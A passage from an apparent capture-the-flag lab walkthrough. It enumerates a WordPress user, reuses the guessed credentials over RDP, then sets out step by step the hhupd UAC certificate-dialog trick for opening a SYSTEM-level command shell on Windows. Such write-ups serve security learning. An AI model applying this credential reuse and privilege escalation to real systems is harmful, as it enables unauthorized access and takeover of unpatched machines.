    |  Login Error Messages (Aggressive Detection)

    [+] Wade
    | Found By: Rss Generator (Passive Detection)
    | Confirmed By: Login Error Messages (Aggressive Detection)

    ```
* Enumeration - browse web site
    * Notice reference to ready player one avatar, google name
* Able to login to Wordpress with above
* Check RDP and was able to login with those creds as well
* Gaining Access - Login to RDP with the creds above
* Privilege Escalation
    * Once you are logged in as a normal user there is an interesting file on the desktop, hhupd
    * Research
        * https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
    * Exploit
        * Double click hhupd
        * In UAC, click show details
        * Next click Show information about the publisher's certificate
        * Next click the Issued By link, this will open a new browser behind the UAC session
        * Close the UAC prompt
        * You now have a browser running as NT Authority/SYSTEM
        * In the browser click Settings > File > Save As
        * An error will pop up, click OK
        * In the filename box search for c:\windows\system32
        * Search for cmd.exe, right click and choose open
        * You now have a privileged shell